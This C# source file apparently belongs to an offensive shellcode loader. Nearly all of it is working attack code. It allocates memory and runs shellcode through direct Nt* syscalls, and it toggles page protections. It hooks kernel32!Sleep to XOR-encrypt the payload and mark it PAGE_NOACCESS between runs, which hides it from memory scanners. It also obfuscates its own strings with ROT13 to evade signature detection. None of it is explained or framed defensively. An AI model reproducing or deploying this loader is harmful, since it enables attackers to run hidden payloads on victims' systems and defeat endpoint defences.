//start
using System.Text;
using System.Linq;
using System;
﻿
using System.IO;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace McChicken
{
    class CurrentThread
    {
        public static void Execute(byte[] shellcode, uint protect, uint timeout, int flipSleep, uint fluctuate, bool debug = false)
        {
            uint allocProtect = 0, newProtect = 0;
            string strAllocProtect = "", strNewProtect = "";
            if (protect == DI.Data.Win32.WinNT.PAGE_EXECUTE_READ)
            {
                allocProtect = DI.Data.Win32.WinNT.PAGE_READWRITE;
                strAllocProtect = new string("CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                newProtect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READ;
                strNewProtect = new string("CNTR_RKRPHGR_ERNQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
            }
            else if (protect == DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE)
            {
                allocProtect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
                strAllocProtect = new string("CNTR_RKRPHGR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
            }

            bool suspended = false;
            if (flipSleep > 0)
            {
                allocProtect = DI.Data.Win32.WinNT.PAGE_READWRITE;
                strAllocProtect = new string("CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                newProtect = DI.Data.Win32.WinNT.PAGE_NOACCESS;
                strNewProtect = new string("CNTR_ABNPPRFF".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                suspended = true;
            }

            #region NtAllocateVirtualMemory (allocProtect)

            IntPtr hProcess = IntPtr.Zero;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                allocProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine($"(CurrentThread) [+] NtAllocateVirtualMemory, {strAllocProtect}");
            else
                throw new Exception($"(CurrentThread) [-] NtAllocateVirtualMemory, {strAllocProtect}: {ntstatus}");

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #endregion

            IntPtr protectAddress;
            uint oldProtect = 0;
            if (newProtect > 0)
            {
                #region NtProtectVirtualMemory (newProtect)

                protectAddress = baseAddress;
                regionSize = (IntPtr)shellcode.Length;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref regionSize,
                    newProtect,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine($"(CurrentThread) [+] NtProtectVirtualMemory, {strNewProtect}");
                else
                    throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, {strNewProtect}: {ntstatus}");

                #endregion
            }

            var fs = new FluctuateShellcode(fluctuate, baseAddress, shellcode.Length, debug);
            if (fluctuate != 0)
            {
                var strFluctuate = new string("CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                if (fluctuate == DI.Data.Win32.WinNT.PAGE_NOACCESS)
                    strFluctuate = new string("CNTR_ABNPPRFF".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());

                if (fs.EnableHook())
                    Console.WriteLine($"(CurrentThread) [+] Installed hook for kernel32!Sleep to fluctuate with {strFluctuate}");
            }

            #region NtCreateThreadEx

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                suspended,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(PheeragGuernq) [+] AgPerngrGuernqRk".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(CurrentThread) [-] NtCreateThreadEx: {ntstatus}");

            #endregion

            if (flipSleep > 0)
            {
                Console.WriteLine($"(CurrentThread) [=] Sleeping for {flipSleep} ms ...");

                System.Threading.Thread.Sleep(flipSleep);

                #region NtProtectVirtualMemory (protect)

                protectAddress = baseAddress;
                regionSize = (IntPtr)shellcode.Length;
                oldProtect = 0;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref regionSize,
                    protect,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine(new string("(PheeragGuernq) [+] AgCebgrpgIveghnyZrzbel, cebgrpg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                else
                    throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, protect: {ntstatus}");

                #endregion

                #region NtResumeThread

                uint suspendCount = 0;

                ntstatus = Syscalls.NtResumeThread(
                    hThread,
                    ref suspendCount);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine(new string("(PheeragGuernq) [+] AgErfhzrGuernq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                else
                    throw new Exception($"(CurrentThread) [-] NtResumeThread: {ntstatus}");

                #endregion
            }

            if (timeout > 0)
            {
                _ = Win32.WaitForSingleObject(hThread, timeout);

                if (oldProtect > 0)
                {
                    #region CleanUp: NtProtectVirtualMemory (PAGE_READWRITE)

                    protectAddress = baseAddress;
                    regionSize = (IntPtr)shellcode.Length;
                    uint tmpProtect = 0;

                    ntstatus = Syscalls.NtProtectVirtualMemory(
                        hProcess,
                        ref protectAddress,
                        ref regionSize,
                        DI.Data.Win32.WinNT.PAGE_READWRITE,
                        ref tmpProtect);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine(new string("(PheeragGuernq.PyrnaHc) [+] AgCebgrpgIveghnyZrzbel, CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    else
                        throw new Exception($"(CurrentThread.CleanUp) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

                    #endregion
                }
                Marshal.Copy(new byte[shellcode.Length], 0, baseAddress, shellcode.Length);

                #region CleanUp: NtFreeVirtualMemory (shellcode)

                regionSize = (IntPtr)shellcode.Length;

                ntstatus = Syscalls.NtFreeVirtualMemory(
                    hProcess,
                    ref baseAddress,
                    ref regionSize,
                    DI.Data.Win32.Kernel32.MEM_RELEASE);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine(new string("(PheeragGuernq.PyrnaHc) [+] AgSerrIveghnyZrzbel, furyypbqr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                else
                    throw new Exception($"(CurrentThread.CleanUp) [-] NtFreeVirtualMemory, shellcode: {ntstatus}");

                #endregion
            }

            #region NtWaitForSingleObject

            ntstatus = Syscalls.NtWaitForSingleObject(
                hThread,
                false,
                0);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(PheeragGuernq) [+] AgJnvgSbeFvatyrBowrpg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");

            #endregion

            if (fluctuate != 0)
                if (fs.DisableHook())
                    Console.WriteLine(new string("(PheeragGuernq) [+] Havafgnyyrq ubbx sbe xreary32!Fyrrc".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            Syscalls.NtClose(hThread);
        }
    }
    class FluctuateShellcode
    {
        delegate void Sleep(uint dwMilliseconds);
        readonly Sleep sleepOrig;
        readonly GCHandle gchSleepDetour;

        readonly IntPtr sleepOriginAddress, sleepDetourAddress;
        readonly byte[] sleepOriginBytes = new byte[16], sleepDetourBytes;

        readonly byte[] trampoline =
        {
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x41, 0xFF, 0xE2
        };

        readonly uint fluctuateWith;
        readonly IntPtr shellcodeAddress;
        readonly int shellcodeLength;
        readonly byte[] xorKey;
        readonly bool printDebug;

        public FluctuateShellcode(uint fluctuate, IntPtr shellcodeAddr, int shellcodeLen, bool debug)
        {
            sleepOriginAddress = DI.DynamicInvoke.Generic.GetLibraryAddress(new string("xreary32.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("Fyrrc".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            sleepOrig = (Sleep)Marshal.GetDelegateForFunctionPointer(sleepOriginAddress, typeof(Sleep));

            Marshal.Copy(sleepOriginAddress, sleepOriginBytes, 0, 16);

            var sleepDetour = new Sleep(SleepDetour);
            sleepDetourAddress = Marshal.GetFunctionPointerForDelegate(sleepDetour);
            gchSleepDetour = GCHandle.Alloc(sleepDetour);

            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms))
            {
                bw.Write((ulong)sleepDetourAddress);
                sleepDetourBytes = ms.ToArray();
            }

            for (var i = 0; i < sleepDetourBytes.Length; i++)
                trampoline[i + 2] = sleepDetourBytes[i];

            fluctuateWith = fluctuate;
            shellcodeAddress = shellcodeAddr;
            shellcodeLength = shellcodeLen;
            xorKey = GenerateXorKey();

            printDebug = debug;
        }

        ~FluctuateShellcode()
        {
            if (gchSleepDetour.IsAllocated)
                gchSleepDetour.Free();

            DisableHook();
        }

        void SleepDetour(uint dwMilliseconds)
        {
            DisableHook();
            ProtectMemory(fluctuateWith, printDebug);
            XorMemory();

            sleepOrig(dwMilliseconds);

            XorMemory();
            ProtectMemory(DI.Data.Win32.WinNT.PAGE_EXECUTE_READ, printDebug);
            EnableHook();
        }

        public bool EnableHook()
        {
            #region NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)

            IntPtr hProcess = IntPtr.Zero;
            IntPtr protectAddress = sleepOriginAddress;
            IntPtr regionSize = (IntPtr)trampoline.Length;
            uint oldProtect = 0;

            var ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                ref oldProtect);

            bool hooked = false;
            if (ntstatus == NTSTATUS.Success)
            {
                Marshal.Copy(trampoline, 0, sleepOriginAddress, trampoline.Length);
                hooked = true;
            }

            #endregion

            #region NtFlushInstructionCache (sleepOriginAddress, trampolineLength)

            hProcess = IntPtr.Zero;
            IntPtr flushAddress = sleepOriginAddress;

            ntstatus = Syscalls.NtFlushInstructionCache(
                hProcess,
                ref flushAddress,
                (uint)trampoline.Length);

            bool flushed = false;
            if (ntstatus == NTSTATUS.Success)
                flushed = true;

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            protectAddress = sleepOriginAddress;
            regionSize = (IntPtr)trampoline.Length;
            uint tmpProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref tmpProtect);

            return ntstatus == NTSTATUS.Success && hooked && flushed;

            #endregion
        }

        public bool DisableHook()
        {
            #region NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)

            IntPtr hProcess = IntPtr.Zero;
            IntPtr protectAddress = sleepOriginAddress;
            IntPtr regionSize = (IntPtr)sleepOriginBytes.Length;
            uint oldProtect = 0;

            var ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                ref oldProtect);

            bool unhooked = false;
            if (ntstatus == NTSTATUS.Success)
            {
                Marshal.Copy(sleepOriginBytes, 0, sleepOriginAddress, sleepOriginBytes.Length);
                unhooked = true;
            }

            #endregion

            #region NtFlushInstructionCache (sleepOriginAddress, sleepOriginBytesLength)

            hProcess = IntPtr.Zero;
            IntPtr flushAddress = sleepOriginAddress;

            ntstatus = Syscalls.NtFlushInstructionCache(
                hProcess,
                ref flushAddress,
                (uint)sleepOriginBytes.Length);

            bool flushed = false;
            if (ntstatus == NTSTATUS.Success)
                flushed = true;

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            protectAddress = sleepOriginAddress;
            regionSize = (IntPtr)sleepOriginBytes.Length;
            uint tmpProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref tmpProtect);

            return ntstatus == NTSTATUS.Success && unhooked && flushed;

            #endregion
        }

        void ProtectMemory(uint newProtect, bool printDebug)
        {
            IntPtr hProcess = IntPtr.Zero;
            IntPtr protectAddress = shellcodeAddress;
            IntPtr regionSize = (IntPtr)shellcodeLength;
            uint oldProtect = 0;

            var ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                newProtect,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
            {
                if (printDebug)
                    Console.WriteLine("(FluctuateShellcode) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + " to 0x" + newProtect.ToString("X2"));
            }
            else
                throw new Exception($"(FluctuateShellcode) [-] NtProtectVirtualMemory, newProtect: {ntstatus}");
        }

        void XorMemory()
        {
            byte[] data = new byte[shellcodeLength];
            Marshal.Copy(shellcodeAddress, data, 0, shellcodeLength);

            for (var i = 0; i < data.Length; i++)
                data[i] ^= xorKey[i];

            Marshal.Copy(data, 0, shellcodeAddress, data.Length);
        }

        byte[] GenerateXorKey()
        {
            Random rnd = new Random();
            byte[] xorKey = new byte[shellcodeLength];
            rnd.NextBytes(xorKey);
            return xorKey;
        }
    }

    
}
